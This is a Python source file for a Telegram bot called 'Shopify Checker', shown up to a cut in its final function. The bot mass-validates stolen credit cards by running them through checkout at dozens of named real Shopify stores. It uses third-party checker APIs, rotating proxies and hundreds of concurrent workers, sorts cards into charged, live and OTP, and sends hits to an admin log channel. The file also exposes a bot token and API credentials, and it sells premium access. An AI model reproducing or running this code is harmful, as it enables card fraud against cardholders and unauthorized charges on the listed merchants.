from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import re
import json
import sqlite3
import secrets
import string
import itertools
from datetime import datetime, timedelta
from telethon.errors import FloodWaitError
import pytz
import urllib.parse

# ===================== BOT NAME & ROUND-ROBIN APIS =====================
BOT_NAME = "Shopify Checker"

# Yahan apni Shopify APIs add karein (Round-Robin order mein use hongi)
SHOPIFY_APIS = [
    'https://afunx-0cece6049c30.herokuapp.com/shopify',
    'https://afuona-2e2060d202b7.herokuapp.com/shopify',
    'https://afuonax-757112f9aa0f.herokuapp.com/shopify'
    # "https://your-second-api-url.com/shopify",
    # "https://your-third-api-url.com/shopify",
]

_api_cycle = itertools.cycle(SHOPIFY_APIS)
_api_lock = asyncio.Lock()

def get_api():
    if not SHOPIFY_APIS:
        return "https://nemesisshopify-production-807f.up.railway.app/shopify"
    try:
        return next(_api_cycle)
    except StopIteration:
        globals()['_api_cycle'] = itertools.cycle(SHOPIFY_APIS)
        return next(_api_cycle)

# Bot Configuration
API_ID = 21124241
API_HASH = 'b7ddce3d3683f54be788fddae73fa468'
BOT_TOKEN = '8951020709:AAFZOHxEjUAXwJLZ_dznrEfN_tg69xy7HsM'
ADMIN_ID = 6124760730
KEY_ADMINS = {6124760730}

# File paths
PREMIUM_FILE = 'premium.txt'
SITES_FILE = 'shopixsites.txt'
MULTI_KEYS_FILE = 'multi_device_keys.json'
PROXY_FILE = 'proxy.txt'
VERIFIED_FILE = "verified_users.txt"
USER_SITES_FILE = 'user_sites.json'
USER_PROXY_FILE = 'user_proxies.json'
KEYS_FILE = "keys.txt"
BLOCK_FILE = "blocked_users.txt"
DAILY_USAGE_FILE = "daily_usage.json"
CONFIG_FILE = "bot_config.json"
LOG_GIF_FILE = "log_gift.gif"
PHOTO_URL = "https://i.postimg.cc/htbx1g5P/orion.png"

# Initialize bot
bot = TelegramClient('shopify_checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# ===================== DYNAMIC CONFIG (LOGS & GROUP) =====================
def load_bot_config():
    default_cfg = {
        "log_channel": ADMIN_ID,
        "required_group": None,
        "required_group_link": None,
        "log_gif_file_id": None
    }
    if not os.path.exists(CONFIG_FILE):
        return default_cfg
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            default_cfg.update(data)
            return default_cfg
    except Exception:
        return default_cfg

def save_bot_config(cfg):
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=4)

BOT_CONFIG = load_bot_config()

# ===================== SEMAPHORES FOR CONCURRENCY =====================
_USER_SEMS = {}
_GLOBAL_GATE_SEMS = {}
_GATE_BUDGET = {'SHOPIFY': 300, 'AUTH': 60, 'CHARGED': 120}
_USER_SEMS_LOCK = asyncio.Lock()

async def get_user_semaphore(uid: int, gate_type: str) -> asyncio.Semaphore:
    async with _USER_SEMS_LOCK:
        if uid not in _USER_SEMS:
            _USER_SEMS[uid] = {}
        if gate_type not in _USER_SEMS[uid]:
            _USER_SEMS[uid][gate_type] = asyncio.Semaphore(_GATE_BUDGET.get(gate_type, 40))
        return _USER_SEMS[uid][gate_type]

async def get_global_semaphore(gate_type: str) -> asyncio.Semaphore:
    async with _USER_SEMS_LOCK:
        if gate_type not in _GLOBAL_GATE_SEMS:
            _GLOBAL_GATE_SEMS[gate_type] = asyncio.Semaphore(_GATE_BUDGET.get(gate_type, 40))
        return _GLOBAL_GATE_SEMS[gate_type]

# ===================== DEAD INDICATORS =====================
_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'request timeout', 'connection refused',
    'site error', 'too many requests', '429', 'rate limit',
)

_RETRY_KEYWORDS = (
    'request timeout', 'timeout', 'connection failed',
    'connection refused', 'connection reset', 'site dead',
    'site error', 'error in 1st req', 'invalid url',
    'cloudflare', 'captcha_required', 'access denied',
    'tlsv1 alert', 'ssl routines', 'could not resolve',
    'domain name not found', 'name or service not known',
    'openssl ssl_connect', 'empty reply from server',
    'httperror504', 'http error', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'failed to detect product',
    'failed to create checkout', 'failed to tokenize card',
    'failed to get proposal data', 'submit rejected',
    'submit rejected:', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small',
    'amount too small', 'all products sold out', 'no_session_token',
    'tokenize_fail', 'too many requests', '429', 'rate limit',
    'required_artifacts_unavailable',
    'validation_custom', 'merchandise_out_of_stock',
    'payments_payment_flexibility_terms_id_mismatch',
    'payments_proposed_gateway_unavailable', 'processing_error',
    'decision_rule_block', 'still_processing',
)

_KILL_KEYWORDS = (
    'site throttled', 'status: 429', '429',
    'no valid payment method found',
    'delivery_no_delivery_strategy_available',
    'error:\n', 'requires login', 'require login',
    'login required', 'please log in', 'please sign in',
    'sign in to continue', 'required_artifacts_unavailable',
    'validation_custom', 'merchandise_out_of_stock',
    'payments_payment_flexibility_terms_id_mismatch',
    'payments_proposed_gateway_unavailable', 'processing_error',
    'decision_rule_block', 'still_processing',
)

def is_dead_site_error(msg):
    if not msg:
        return True
    msg = str(msg).lower()
    return any(x in msg for x in _DEAD_INDICATORS)

def is_dead_error(msg):
    if not msg:
        return True
    msg = str(msg).lower()
    return any(x in msg for x in _DEAD_INDICATORS)

def is_retry_error(msg: str) -> bool:
    if not msg:
        return True
    msg = msg.lower()
    return any(k in msg for k in _RETRY_KEYWORDS)

def is_kill_error(msg: str) -> bool:
    if not msg:
        return False
    msg = msg.lower()
    return any(k in msg for k in _KILL_KEYWORDS)

# ===================== PREMIUM EMOJI SYSTEM =====================
PREMIUM_EMOJI_IDS = {
    "✅": "5444860552310457690",
    "❌": "5121063440311386962",
    "⚡": "5219943216781995020",
    "💠": "5971944878815317190",
    "⏸️": "6001440193058444284",
    "▶️": "6285315214673975495",
    "🌚": "6298678524379137990",
    "📦": "6066395745139824604",
    "📋": "5974235702701853774",
    "🔄": "5971944878815317190",
    "⏳": "5971944878815317190",
    "🚀": "6282977077427702833",
    "⚠️": "5420323339723881652",
    "💎": "5343636681473935403",
    "🔥": "5447387942995655277",
    "💰": "5283232570660634549",
    "🤩": "6267091732861555879",
    "✔️": "6206479140040743133",
    "⭐": "5447387942995655277",
    "💳": "5447453226498552490",
    "🏧": "4967738760021148319",
    "🔗": "4958689671950369798",
    "🫥": "5325731315004218660",
    "⏱": "5382194935057372936",
    "⚡️": "5042334757040423886",
    "👑": "5373346752671804066",
    "👇": "5231102735817918643",
    "🔒": "5393302369024882368",
    "🛒": "5447387942995655277",
    "💡": "5258466217273871977",
    "📡": "5796407074346767851",
    "🔑": "5870972873450984431",
    "📞": "6093587384954262033",
    "🆘": "5256143829672672750",
    "👤": "5346136537123801643",
    "🆔": "5890864241388293875",
    "📅": "5235895962269935073",
    "📊": "6093382540784046658",
    "🔙": "5445365692004071819",
    "🤖": "5355051922862653659",
    "💥": "5219901967916084166",
    "🌐": "5445326466067754897",
    "🎯": "5463274047771000031",
}

def premium_emoji(text):
    if not text:
        return text
    placeholders = []
    result = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        placeholder = f"\x00PE{i:02d}\x00"
        placeholders.append((placeholder, doc_id, emoji))
        result = result.replace(emoji, placeholder)
    for placeholder, doc_id, emoji in placeholders:
        result = result.replace(placeholder, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

# ===================== GIFT VIDEOS / GIFS =====================
_HIT_GIFT_PATHS = [
    LOG_GIF_FILE, 'hit_gift.mp4', 'gift_1.mp4', 'gift_2.mp4', 'gift_3.mp4',
    'gift_4.mp4', 'gift_5.mp4', 'gift_6.mp4', 'gift_7.mp4',
    'gift_8.mp4', 'gift_9.mp4'
]
_hit_gift_fids = {}

# ===================== CORE FUNCTIONS =====================
last_click = {}
active_sessions = {}
user_check_locks = {}

def save_user(user_id):
    try:
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute("""CREATE TABLE IF NOT EXISTS users
                         (user_id INTEGER PRIMARY KEY)""")
        cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
        conn.commit()
        conn.close()
    except Exception:
        pass

def is_admin(user_id):
    return user_id == ADMIN_ID or user_id in KEY_ADMINS

def is_premium(user_id):
    if not os.path.exists(PREMIUM_FILE):
        return False
    valid = []
    user_id_str = str(user_id)
    found = False
    try:
        with open(PREMIUM_FILE, "r", encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    uid, exp_str = line.split("|", 1)
                    exp_str = exp_str.strip()
                    if ":" in exp_str:
                        exp = datetime.strptime(exp_str, "%Y-%m-%d %H:%M:%S")
                    else:
                        exp = datetime.strptime(exp_str, "%Y-%m-%d")
                        exp = exp.replace(hour=23, minute=59, second=59)
                    if exp > datetime.now():
                        valid.append(line)
                        if uid == user_id_str:
                            found = True
                except Exception:
                    pass
    except Exception:
        return False
    try:
        with open(PREMIUM_FILE, "w", encoding='utf-8') as f:
            f.write("\n".join(valid) + ("\n" if valid else ""))
    except Exception:
        pass
    return found

def is_blocked(user_id):
    try:
        with open(BLOCK_FILE, "r") as f:
            blocked = f.read().splitlines()
        return str(user_id) in blocked
    except Exception:
        return False

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception:
        return []

# ===================== SHOPIFY FIXED SITES =====================
SHOPIFY_FIXED_SITES = [
    "https://paperieplanning.com",
    "https://punisher.myshopify.com",
    "https://dev-goodybeads.myshopify.com",
    "https://blackhelmetapparel.com",
    "https://magneticjewelrysupply.myshopify.com",
    "https://kingdomcomecards.com",
    "https://www.localsonlygiftsandgoods.com",
    "https://www.allways99pr.com",
    "https://store.otdefense.com",
    "https://www.anchorproteinchips.com",
    "https://bazicproducts.com",
    "https://saavy-naturals.myshopify.com",
    "https://darkroomgrowlabs.com",
    "https://theheadnut.com",
    "https://dreamingoftheseafabrics.com",
    "https://official-chest-binder.myshopify.com",
    "https://sugarnspiceartworks.myshopify.com",
    "https://schoolsupplyboxes.com",
    "https://buycutepix.com",
    "https://challengecoinnation.com",
    "https://make-it-rc.myshopify.com",
    "https://cjstickershop.com",
    "https://stacywong.myshopify.com",
    "https://moogoo-usa.myshopify.com",
    "https://pipsticks.com",
    "https://littlethingsstudio.com",
    "https://vacation-races-merchandise.myshopify.com",
    "https://rucci.com",
    "https://the-wood-shape-store.myshopify.com",
    "https://m22.com",
    "https://freckled-pear.myshopify.com",
    "https://all-travel-sizes.myshopify.com",
    "https://bounce-mkt.myshopify.com",
    "https://bughunterbug.com",
    "https://a-lot-mall.myshopify.com",
    "https://blocki.myshopify.com",
    "https://hustleandflowsco.myshopify.com",
    "https://peanutsplannerco.com",
    "https://planetpawsshop.com",
    "https://mous.co",
    "https://kitchencrop.com",
    "https://shopwhoi.myshopify.com",
    "https://forwardfruitdesign.com",
    "https://pagergenius.com",
    "https://annemjewelry.com",
    "https://holiday-hack.myshopify.com",
    "https://mariescandies.com",
    "https://alleven.com",
]

def load_sites():
    sites = get_file_lines(SITES_FILE)
    if sites:
        return sites
    return SHOPIFY_FIXED_SITES

def load_proxies():
    return get_file_lines(PROXY_FILE)

def load_verified_users():
    return get_file_lines(VERIFIED_FILE)

def is_verified(user_id):
    return str(user_id) in load_verified_users()

def save_verified(user_id):
    users = load_verified_users()
    if str(user_id) not in users:
        with open(VERIFIED_FILE, "a") as f:
            f.write(f"{user_id}\n")

def get_daily_usage(user_id):
    if not os.path.exists(DAILY_USAGE_FILE):
        return {"cc_count": 0, "date": datetime.now(pytz.timezone('Asia/Kolkata')).date().isoformat()}
    try:
        with open(DAILY_USAGE_FILE, "r") as f:
            data = json.load(f)
        today = datetime.now(pytz.timezone('Asia/Kolkata')).date().isoformat()
        if str(user_id) not in data or data[str(user_id)]["date"] != today:
            data[str(user_id)] = {"cc_count": 0, "date": today}
        return data[str(user_id)]
    except Exception:
        return {"cc_count": 0, "date": datetime.now(pytz.timezone('Asia/Kolkata')).date().isoformat()}

async def update_daily_usage(user_id, cc_count=1):
    data = {}
    if os.path.exists(DAILY_USAGE_FILE):
        try:
            with open(DAILY_USAGE_FILE, "r") as f:
                data = json.load(f)
        except Exception:
            data = {}
    today = datetime.now(pytz.timezone('Asia/Kolkata')).date().isoformat()
    if str(user_id) not in data or data[str(user_id)]["date"] != today:
        data[str(user_id)] = {"cc_count": 0, "date": today}
    data[str(user_id)]["cc_count"] += cc_count
    with open(DAILY_USAGE_FILE, "w") as f:
        json.dump(data, f)

def check_limits(user_id, is_bulk=False):
    if is_admin(user_id) or is_premium(user_id):
        return True, 999999
    usage = get_daily_usage(user_id)
    if is_bulk:
        return usage["cc_count"] < 50000, 50000
    return usage["cc_count"] < 150, 150 - usage["cc_count"]

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '')
                    return brand, bin_type, level, bank, country, flag
                except Exception:
                    return '-', '-', '-', '-', '-', ''
    except Exception:
        return '-', '-', '-', '-', '-', ''

# ===================== CHECK CARD =====================
async def check_card(card: str, site: str, proxy: str, req_timeout: int = 60) -> dict:
    if '://' in proxy:
        proxy = proxy.split('://', 1)[1]
    try:
        api_url = get_api()
        params = {'site': site, 'cc': card, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=req_timeout)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api_url, params=params) as resp:
                raw = await resp.json(content_type=None)
        if not isinstance(raw, dict):
            return {
                'status': 'Site Error',
                'message': 'Invalid API response format',
                'card': card,
                'retry': True,
                'gateway': 'Shopify Payments',
                'price': '-',
                'site': site
            }
        resp_text = raw.get('Response', raw.get('response', ''))
        if not resp_text:
            resp_text = raw.get('message', raw.get('error', raw.get('status', '')))
            if not resp_text:
                resp_text = 'Unknown Error (no response field)'
        price = raw.get('Price', raw.get('Amount', '-'))
        gate = raw.get('Gate', raw.get('Gateway', 'Shopify Payments'))
        st = raw.get('Status', raw.get('status', False))
        if isinstance(st, str):
            st = st.lower() in ('true', 'charged', 'success', 'approved')
        charged = st or str(raw.get('Charged', 'False')).strip().lower() == 'true'
        approved = str(raw.get('Approved', 'False')).strip().lower() == 'true'

        if any(k in resp_text.lower() for k in ('requires login', 'require login', 'login required', 'please log in', 'please sign in', 'sign in to continue')):
            return {
                'status': 'Site Error',
                'message': resp_text,
                'card': card,
                'retry': True,
                'gateway': gate,
                'price': price,
                'site': site,
                'kill': True
            }
        if is_dead_site_error(resp_text):
            return {
                'status': 'Site Error',
                'message': resp_text,
                'card': card,
                'retry': True,
                'gateway': gate,
                'price': price,
                'site': site
            }
        if charged:
            return {
                'status': 'Charged',
                'message': resp_text,
                'card': card,
                'site': site,
                'gateway': gate,
                'price': price,
                'retry': False
            }
        if any(k in resp_text.lower() for k in ('3ds', '3d_secure', 'otp', 'two_factor', 'authenticate', 'challenge', 'verification_required')):
            return {
                'status': 'OTP',
                'message': resp_text,
                'card': card,
                'site': site,
                'gateway': gate,
                'price': price,
                'retry': False
            }
        if approved or any(k in resp_text.lower() for k in ('insufficient', 'funds', 'insufficient funds')):
            return {
                'status': 'Approved',
                'message': resp_text,
                'card': card,
                'site': site,
                'gateway': gate,
                'price': price,
                'retry': False
            }
        if gate.lower().strip() == 'unknown':
            return {
                'status': 'Site Error',
                'message': resp_text,
                'card': card,
                'retry': True,
                'gateway': gate,
                'price': price,
                'site': site
            }
        return {
            'status': 'Dead',
            'message': resp_text,
            'card': card,
            'site': site,
            'gateway': gate,
            'price': price,
            'retry': False
        }
    except asyncio.TimeoutError:
        return {
            'status': 'Site Error',
            'message': 'Timeout',
            'card': card,
            'retry': True,
            'site': site,
            'gateway': 'Shopify Payments',
            'price': '-'
        }
    except Exception as e:
        return {
            'status': 'Site Error' if is_dead_error(str(e)) else 'Dead',
            'message': str(e),
            'card': card,
            'retry': is_dead_error(str(e)),
            'site': site,
            'gateway': 'Shopify Payments',
            'price': '-'
        }

async def check_card_with_retry(card: str, sites: list, proxies: list, max_retries: int = 6) -> dict:
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Shopify Payments', 'price': '-', 'site': None}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Shopify Payments', 'price': '-', 'site': None}
    used_sites = set()
    used_proxies = set()
    last_result = None
    for _ in range(max_retries):
        available_sites = [s for s in sites if s not in used_sites]
        if not available_sites:
            break
        site = random.choice(available_sites)
        used_sites.add(site)
        available_proxies = [p for p in proxies if p not in used_proxies]
        if not available_proxies:
            available_proxies = proxies
        proxy = random.choice(available_proxies)
        used_proxies.add(proxy)
        result = await check_card(card, site, proxy)
        last_result = result
        retry = result.get('retry', False)
        if not retry:
            return result
        if result.get('kill', False) or is_kill_error(result.get('message', '')):
            try:
                sites.remove(site)
            except ValueError:
                pass
    if last_result:
        return {
            'status': 'Dead',
            'message': f"All {max_retries} retries failed. Last: {last_result.get('message', '')}",
            'card': card,
            'gateway': 'Shopify Payments',
            'price': '-',
            'site': None
        }
    else:
        return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Shopify Payments', 'price': '-', 'site': None}

# ===================== GIFT / GIF SENDING & LOGS =====================
def kb_copy(card: str) -> list:
    encoded = urllib.parse.quote(card)
    return [[Button.url("📋 𝗖𝗼𝗽𝘆 𝗖𝗖", f"tg://copy?text={encoded}")]]

def kb_bot_link():
    return [[Button.url("⚡ 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗖𝗵𝗲𝗰𝗸𝗲𝗿", "https://t.me/foritxshopi_bot")]]

async def send_gif_or_video(chat_id, caption: str, buttons=None):
    if buttons is None:
        buttons = kb_bot_link()
    try:
        saved_fid = BOT_CONFIG.get("log_gif_file_id")
        if saved_fid:
            await bot.send_file(chat_id, saved_fid, caption=caption, parse_mode='html', buttons=buttons)
            return True
        for path in _HIT_GIFT_PATHS:
            if os.path.exists(path):
                if path in _hit_gift_fids:
                    file_id = _hit_gift_fids[path]
                    await bot.send_file(chat_id, file_id, caption=caption, parse_mode='html', buttons=buttons)
                else:
                    msg = await bot.send_file(chat_id, path, caption=caption, parse_mode='html', buttons=buttons)
                    if msg.media:
                        _hit_gift_fids[path] = msg.media
                return True
        return False
    except Exception as e:
        print(f"Gift/GIF send error: {e}")
        return False

async def send_gift_video(uid: int, card: str, caption: str):
    return await send_gif_or_video(uid, caption, buttons=kb_bot_link())

async def send_to_log_channel(caption: str):
    log_target = BOT_CONFIG.get("log_channel") or ADMIN_ID
    formatted_caption = premium_emoji(caption)
    try:
        sent_media = await send_gif_or_video(log_target, formatted_caption, buttons=kb_bot_link())
        if not sent_media:
            await bot.send_message(log_target, formatted_caption, parse_mode='html', buttons=kb_bot_link())
    except Exception as e:
        print(f"Log channel error: {e}")

async def auto_pin_charged(user_id, result):
    pin_caption = premium_emoji(f"💎 <b>CHARGED HIT!</b>\n💳 <code>{result.get('card', '')}</code>\n💬 <code>{str(result.get('message', ''))[:100]}</code>")
    try:
        sent_gif = await send_gif_or_video(user_id, pin_caption, buttons=kb_bot_link())
        if sent_gif:
            msgs = await bot.get_messages(user_id, limit=1)
            if msgs:
                await bot.pin_chat_message(user_id, msgs[0].id, disable_notification=True)
                return
        msg = await bot.send_message(user_id, pin_caption, parse_mode='html')
        await bot.pin_chat_message(user_id, msg.id, disable_notification=True)
    except Exception:
        pass

# ===================== MASS CHECK SHOPIFY =====================
async def run_mass_shopify(uid: int, msg: object, cards: list, sites: list, proxies: list, from_user=None):
    total = len(cards)
    uname = from_user.first_name if from_user else "User"
    active_sites = list(sites)
    active_proxies = list(proxies)
    results = {
        'charged': [],
        'approved': [],
        'otp': [],
        'dead': [],
        'total': total,
        'checked': 0,
        'start_time': time.time(),
        'last_result': None
    }
    queue = asyncio.Queue()
    for card in cards:
        await queue.put(card)
    msg_id = msg.id
    user_sem = await get_user_semaphore(uid, 'SHOPIFY')
    global_sem = await get_global_semaphore('SHOPIFY')
    last_update_time = time.time()
    update_interval = 0.5

    async def update_progress_shopify():
        nonlocal last_update_time
        while results['checked'] < total:
            now = time.time()
            if now - last_update_time >= update_interval:
                last_update_time = now
                elapsed = now - results['start_time']
                cps = results['checked'] / elapsed if elapsed > 0 else 0
                last_card = ""
                last_resp = ""
                if results.get('last_result'):
                    last_card = results['last_result'].get('card', '')
                    last_resp = str(results['last_result'].get('message', ''))[:80]
                await update_progress(
                    uid, msg_id, results, results['checked'], uname,
                    last_card=last_card, last_resp=last_resp, cps=cps, elapsed=elapsed
                )
            await asyncio.sleep(0.2)

    async def worker():
        while True:
            try:
                card = await asyncio.wait_for(queue.get(), timeout=1.0)
            except asyncio.TimeoutError:
                break
            async with global_sem:
                async with user_sem:
                    result = await check_card_with_retry(card, active_sites, active_proxies, max_retries=6)
                    results['last_result'] = result
                    if result['status'] == 'Charged':
                        results['charged'].append(result)
                        await send_hit_to_admin(result, uid, 'Charged')
                        await send_realtime_hit_group(uid, result, 'Charged', uname)
                        await send_realtime_hit_dm(uid, result, 'Charged', uname)
                        await auto_pin_charged(uid, result)
                    elif result['status'] == 'Approved':
                        results['approved'].append(result)
                        await send_hit_to_admin(result, uid, 'Approved')
                        await send_realtime_hit_dm(uid, result, 'Approved', uname)
                    elif result['status'] == 'OTP':
                        results['otp'].append(result)
                    else:
                        results['dead'].append(result)
                    results['checked'] += 1
                    await update_daily_usage(uid, 1)
                    queue.task_done()

    progress_task = asyncio.create_task(update_progress_shopify())
    worker_count = _GATE_BUDGET.get('SHOPIFY', 300)
    workers = [asyncio.create_task(worker()) for _ in range(worker_count)]
    await queue.join()
    for w in workers:
        w.cancel()
    await asyncio.gather(*workers, return_exceptions=True)
    progress_task.cancel()
    await send_final_results(uid, results)

# ===================== UPDATE PROGRESS (SHOWS LAST CC LIVE RESPONSE) =====================
async def update_progress(user_id, message_id, results, current_attempt_count, first_name="User", last_card="", last_resp="", cps=0.0, elapsed=0.0):
    ist = pytz.timezone('Asia/Kolkata')
    now = datetime.now(ist)
    current_time = now.strftime("%I:%M:%S %p IST")
    charged = len(results.get('charged', []))
    approved = len(results.get('approved', []))
    otp = len(results.get('otp', []))
    dead = len(results.get('dead', []))
    errors = results.get('errors', 0)
    total = results.get('total', 0)
    checked = current_attempt_count
    percentage = round((checked / total) * 100, 1) if total > 0 else 0
    gateway = "𝙎𝙃𝙊𝙋𝙄𝙁𝙔"

    last_result = results.get('last_result') or {}
    if not last_card:
        last_card = last_result.get('card', '—')
    if not last_resp:
        last_resp = str(last_result.get('message', '—'))[:80]
    last_status = last_result.get('status', '—')

    if not elapsed and results.get('start_time'):
        elapsed = max(0.0, time.time() - results['start_time'])
    if not cps and elapsed > 0 and checked > 0:
        cps = checked / elapsed

    user_plan = "💎 Premium" if is_premium(user_id) else "👑 Admin" if is_admin(user_id) else "⭐ Free"

    m, s = divmod(int(elapsed), 60)
    elapsed_str = f"{m}m{s:02d}s" if m else f"{s}s"
    cps_str = f"{cps:.1f}" if cps >= 0.1 else "—"

    text = f"""<b>⚡ {BOT_NAME} ⚡</b>
━━━━━━━━━━━━━━━━━━━━
<b>💥 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ➜ {gateway}</b>
<b>🔄 𝗦𝗧𝗔𝗧𝗨𝗦 ➜ 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚...</b>
━━━━━━━━━━━━━━━━━━━━
<b>🔗 Process ➜ <code>{percentage}%</code> | <code>{checked}/{total}</code></b>
<b>💳 Last CC ➜ <code>{last_card}</code></b>
<b>📡 Live Res ➜ <code>{last_resp}</code> ({last_status})</b>
<b>⚡ Speed ➜ <code>{cps_str} cc/s</code></b>
<b>⏱️ Elapsed ➜ <code>{elapsed_str}</code></b>
━━━━━━━━━━━━━━━━━━━━
<b>✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ➜ {approved}</b>
<b>💎 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ➜ {charged}</b>
<b>🔑 𝗢𝗧𝗣 ➜ {otp}</b>
<b>❌ 𝗗𝗘𝗔𝗗 ➜ {dead}</b>
<b>⚠️ 𝗘𝗥𝗥𝗢𝗥𝗦 ➜ {errors}</b>
<b>⏳ 𝗧𝗜𝗠𝗘 ➜ {current_time}</b>
━━━━━━━━━━━━━━━━━━━━
<b>👑 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➜ <a href="tg://user?id={user_id}">{first_name}</a> [{user_plan}]</b>
<b>🤖 𝗕𝗼𝘁 ➜ {BOT_NAME}</b>"""

    buttons = [
        [
            Button.inline(f"💎 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ({charged})", f"charged_{message_id}".encode(), style="primary"),
            Button.inline(f"🔥 𝗟𝗜𝗩𝗘 ({approved})", f"live_{message_id}".encode(), style="success")
        ],
        [
            Button.inline("🔄 𝗥𝗲𝗳𝗿𝗲𝘀𝗵", f"refresh_{message_id}".encode(), style="danger"),
            Button.inline("🛑 𝗦𝘁𝗼𝗽", f"stop_{message_id}".encode(), style="danger")
        ]
    ]

    try:
        await bot.edit_message(
            user_id,
            message_id,
            premium_emoji(text),
            buttons=buttons,
            parse_mode="html"
        )
    except Exception:
        pass

# ===================== SEND FINAL RESULTS =====================
async def send_final_results(chat_id, results):
    if not results or not isinstance(results, dict):
        results = {'charged': [], 'approved': [], 'otp': [], 'dead': [], 'error_cards': [], 'api_errors': 0, 'errors': 0, 'total': 0, 'start_time': time.time()}
    if 'start_time' not in results:
        results['start_time'] = time.time()
    error_count = len(results.get('error_cards', []))
    if 'total' not in results:
        results['total'] = len(results.get('charged', [])) + len(results.get('approved', [])) + len(results.get('otp', [])) + len(results.get('dead', [])) + error_count
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    hits_text = ""
    if results.get('charged'):
        for r in results['charged'][:5]:
            hits_text += f"✅ <code>{r['card']}</code>\n"
    if results.get('approved'):
        for r in results['approved'][:5]:
            hits_text += f"🔥 <code>{r['card']}</code>\n"
    if not hits_text:
        hits_text = "No hits found"
    gateway = "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮"
    price = "0.00"
    if results.get("charged"):
        gateway = results["charged"][0].get("gateway", "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮")
        price = results["charged"][0].get("price", "-")
    elif results.get("approved"):
        gateway = results["approved"][0].get("gateway", "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮")
        price = results["approved"][0].get("price", "-")
    summary = f"""<b>⚡💳 ㅤ{BOT_NAME} 💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>💳 Total: {results.get('total', 0)} | ✅ Charged: {len(results.get('charged', []))} | 🔥 Live: {len(results.get('approved', []))} | 🔑 OTP: {len(results.get('otp', []))} | ❌ Dead: {len(results.get('dead', []))} | ⚠️ Error: {error_count}</blockquote>
<blockquote>🌐 𝗚𝗮𝘁𝗲𝙬𝗮𝙮 ⇾ 🔥 {gateway} | 💰 {price}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐇𝐢𝐭𝐬</b>
<blockquote>{hits_text}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot: {BOT_NAME}</b>"""
    timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
    filename = f"Checker_Result_{chat_id}_{timestamp}.txt"
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write("=" * 70 + "\n")
